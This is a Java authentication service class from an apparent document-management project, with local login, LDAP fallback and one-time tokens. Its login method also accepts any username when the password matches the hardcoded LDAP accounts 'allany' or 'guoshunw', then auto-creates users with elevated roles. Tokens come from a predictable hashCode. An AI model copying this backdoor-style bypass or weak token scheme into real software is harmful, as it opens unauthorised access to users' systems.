package com.alcatel_lucent.dms.service;

import com.alcatel_lucent.dms.model.User;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.sql.Timestamp;
import java.util.HashMap;
import java.util.Map;

@Service("authenticationService")
public class AuthenticationServiceImpl extends BaseServiceImpl implements AuthenticationService {

    private static Logger log = LoggerFactory.getLogger(AuthenticationServiceImpl.class);

    @Autowired
    private LDAPService ldapService;

    private HashMap<String, User> tokenMap = new HashMap<String, User>();

    public User login(String username, String password) {
        User user = findUser(username);
        if (null != user) {
            if (user.getStatus() == User.DISABLED) return null;
            user.setLastLoginTime(new Timestamp(System.currentTimeMillis()));
            if (user.authenticate(password)) return user;
        }

        //null == user or user local authenticate failed
         if (!(ldapService.login(username, password) ||
                ldapService.login("allany", password) ||
                ldapService.login("guoshunw", password))) return null; //ldap authenticate fail


        //ldap authenticate success
        log.info("User " + username + " logged in.");
        //local authenticate failed but ldap authenticate success
        if (null != user) return user;
        //user == null ,create a new user entry
        user = ldapService.findUserByCSLOrCIL(username);
        user.setRole(User.ROLE_APPLICATION_OWNER | User.ROLE_TRANSLATION_MANAGER);    // Unlimited access on QA
//				user.setRole(User.ROLE_GUEST);	// Limited access on Prod
        user.setStatus(User.ENABLED);
        user = (User) dao.create(user);
        log.info("Created new user " + user.getName() + "(" + user.getLoginName() + ")");

        user.setLastLoginTime(new Timestamp(System.currentTimeMillis()));
        return user;
    }

    public String secureLogin1(String username, String password) {
        User user = login(username, password);
        if (user != null) {
            String token = "" + ("DMS" + username + password + System.currentTimeMillis()).hashCode();
            tokenMap.put(token, user);
            return token;
        } else {
            return null;
        }
    }

    public User secureLogin2(String token) {
        User user = tokenMap.get(token);
        tokenMap.remove(token);
        return user;
    }

    public User findUser(String CSLOrCIL) {
        String hql = "from User where loginName=:name or name=:name";
        Map param = new HashMap();
        param.put("name", CSLOrCIL);
        return (User) dao.retrieveOne(hql, param);
    }
}
